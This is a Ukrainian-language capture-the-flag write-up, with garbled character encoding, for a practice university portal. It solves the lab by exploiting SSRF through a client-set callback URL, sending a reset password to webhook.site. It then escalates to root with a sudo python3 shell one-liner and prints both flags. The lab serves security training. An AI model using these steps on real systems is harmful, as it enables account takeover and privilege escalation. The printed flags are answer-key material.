<p align="center">
  <img src="/.img/Screenshot_1.png" alt="image" width="640" height="360" />
</p>

# üß© NewTriton
## **–ö–∞—Ç–µ–≥–æ—Ä—ñ—è:** Offensive Security  
## **–°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å:** Medium  

---

### **–û–ø–∏—Å –∑–∞–≤–¥–∞–Ω–Ω—è:**  
–£–Ω—ñ–≤–µ—Ä—Å–∏—Ç–µ—Ç —Ä–æ–∑—Ä–æ–±–ª—è—î –Ω–æ–≤—É –æ—Å–≤—ñ—Ç–Ω—é –ø–ª–∞—Ç—Ñ–æ—Ä–º—É ‚Äî NewTriton. –¶–µ —Å—É—á–∞—Å–Ω–∏–π –ø–æ—Ä—Ç–∞–ª –¥–ª—è —Å—Ç—É–¥–µ–Ω—Ç—ñ–≤ —Ç–∞ –≤–∏–∫–ª–∞–¥–∞—á—ñ–≤ —ñ–∑ –æ—Å–æ–±–∏—Å—Ç–∏–º–∏ –∫–∞–±—ñ–Ω–µ—Ç–∞–º–∏, –¥–æ—Å—Ç—É–ø–æ–º –¥–æ –Ω–∞–≤—á–∞–ª—å–Ω–∏—Ö –º–∞—Ç–µ—Ä—ñ–∞–ª—ñ–≤ —Ç–∞ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∏—Ö —Å–µ—Ä–≤—ñ—Å—ñ–≤.  
–ù–∞—Ä–∞–∑—ñ –∫–æ–º–∞–Ω–¥–∞ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫—ñ–≤ –ø—Ä–∞—Ü—é—î –Ω–∞–¥ —Ñ—É–Ω–∫—Ü—ñ—î—é —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è. –í–æ–Ω–∏ –Ω–µ –≤–ø–µ–≤–Ω–µ–Ω—ñ —É —ó—ó –±–µ–∑–ø–µ—Ü—ñ, —Ç–æ–º—É –∑–∞–ø—Ä–æ—à—É—é—Ç—å —Ç–µ–±–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Å–∏—Å—Ç–µ–º—É –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.  
Q1: –û—Ç—Ä–∏–º–∞–π—Ç–µ admin (user) flag. –í—ñ–¥–ø–æ–≤—ñ–¥—å –ø–æ–¥–∞–π—Ç–µ —É —Ñ–æ—Ä–º–∞—Ç—ñ actf{flag}.  
Q2: –û—Ç—Ä–∏–º–∞–π—Ç–µ root flag. –í—ñ–¥–ø–æ–≤—ñ–¥—å –ø–æ–¥–∞–π—Ç–µ —É —Ñ–æ—Ä–º–∞—Ç—ñ actf{flag}.  
  
---
### **–†–æ–∑–≤'—è–∑–∞–Ω–Ω—è:**  
1. –ü–æ–¥–∏–≤–∏–º–æ—Å—å –Ω–∞ –≤–µ–±-—Å–µ—Ä–≤—ñ—Å.  
  <p align="center">  
    <img src=".img/Screenshot_1.png" alt="–í–µ–±-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å" />  
  </p>  
  
2. –ú–∞—î–º–æ —Å–µ—Ä–≤—ñ—Å –¥–ª—è —Å–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—é.  
  –ü—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤—Ü—ñ `admin` –º–∞—î–º–æ –ø–æ–∑–∏—Ç–∏–≤–Ω—É –≤—ñ–¥–ø–æ–≤—ñ–¥—å, –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—ñ —ñ–Ω—à–∏—Ö –æ—Ç—Ä–∏–º–∞—î–º–æ –ø–æ–º–∏–ª–∫—É.  
  <p align="center">  
    <img src=".img/Screenshot_2.png" alt="–°–∫–∏–¥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—é admin" />  
  </p>  
  <p align="center">  
    <img src=".img/Screenshot_3.png" alt="–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ —ñ–Ω—à–∏—Ö –ª–æ–≥—ñ–Ω–∞—Ö" />  
  </p>  
  
3. –ü–µ—Ä–µ–±—ñ—Ä –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ–π –Ω—ñ—á–æ–≥–æ –Ω–µ –¥–∞—î, —Ç–æ–º—É –ø–æ–¥–∏–≤–∏–º–æ—Å—å source –∫–æ–¥ —Å—Ç–æ—Ä—ñ–Ω–∫–∏.  
  ```js
  <script>
    const form = document.getElementById('recover-form');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('username').value;

      const payload = {
        username: username,
        callback_url: "http://127.0.0.1:5000/internal/admin-crm"
      };

      const res = await fetch('/api/recover', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const result = document.getElementById('result');
      if (res.ok) {
        result.innerHTML = '<div class="alert alert-success">–ó–∞–ø–∏—Ç –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∏–π!</div>';
      } else {
        result.innerHTML = '<div class="alert alert-danger">–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ –∑–∞–ø–∏—Ç—É</div>';
      }
    });
  </script>
  ```

4. –£ –∫–æ–¥—ñ –º–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ `callback_url` –∑–∞–¥–∞—î—Ç—å—Å—è –ø—Ä—è–º–æ –∑—ñ —Å—Ç–æ—Ä–æ–Ω–∏ –∫–ª—ñ—î–Ω—Ç–∞, —â–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ **SSRF**.  

   –°–ø—Ä–æ–±—É—î–º–æ –ø—ñ–¥–º—ñ–Ω–∏—Ç–∏ URL –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **BurpSuite**, —Ç–∞ –æ—Ç—Ä–∏–º–∞—î–º–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç —ñ–∑ –¥–æ–ø–æ–º–æ–≥–æ—é [webhook.site](https://webhook.site/).  
  <p align="center">  
    <img src=".img/Screenshot_4.png" alt="BurpSuite –ø—ñ–¥–º—ñ–Ω–∞ URL" />  
  </p>  
  <p align="center">  
    <img src=".img/Screenshot_5.png" alt="Webhook —Ä–µ–∑—É–ª—å—Ç–∞—Ç" />  
  </p>  
  <p align="center">  
    <img src=".img/Screenshot_6.png" alt="–û—Ç—Ä–∏–º–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å" />  
  </p>  
  
6. –ú–∞—î–º–æ –Ω–æ–≤–∏–π –ø–∞—Ä–æ–ª—å. –û—Å–∫—ñ–ª—å–∫–∏ –Ω–∞ —Ä–µ—Å—É—Ä—Å—ñ –Ω–µ–º–∞—î –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö endpoint‚Äô—ñ–≤, —Å–ø—Ä–æ–±—É—î–º–æ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—å –ø–æ **ssh** —ñ –≤ –¥–æ–º–∞—à–Ω—ñ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó –∑–Ω–∞—Ö–æ–¥–∏–º–æ –ø–µ—Ä—à–∏–π —Ñ–ª–∞–≥.
  <p align="center">  
    <img src=".img/Screenshot_7.png" alt="SSH –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è" />  
  </p>  
  
---
#### Flag: ```actf{admin_reset_flag_5ka3-J}```  
---
  
8. –î–∞–ª—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∏–º–æ `sudo -l`:  
```  
admin@9b94dc4afeb7:~$ sudo -l  
Matching Defaults entries for admin on 9b94dc4afeb7:  
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  

User admin may run the following commands on 9b94dc4afeb7:  
    (ALL) ALL  
    (ALL) NOPASSWD: /usr/bin/python3  
```  

  –ú–∞—î–º–æ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–∞–ø—É—Å–∫–∞—Ç–∏ `python3`.  
  –ù–∞ [GTFOBins](https://gtfobins.github.io/gtfobins/python/) —î —Å—Ç–æ—Ä—ñ–Ω–∫–∞, —è–∫–∞ –ø–æ—è—Å–Ω—é—î, —è–∫ –æ—Ç—Ä–∏–º–∞—Ç–∏ **root** –∑–∞ –π–æ–≥–æ –¥–æ–ø–æ–º–æ–≥–æ—é.  
   
9. –û—Ç—Ä–∏–º—É—î–º–æ root —Ç–∞ –¥–∏–≤–∏–º–æ—Å—å —Ñ–ª–∞–≥ —É –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó `/root/`.
    
    `sudo python3 -c 'import os; os.system("/bin/sh")'` 
  <p align="center">  
    <img src=".img/Screenshot_8.png" alt="Root flag" />  
  </p>  

---
#### Flag: ```actf{root_py_flag_5@8gEx}```  
---
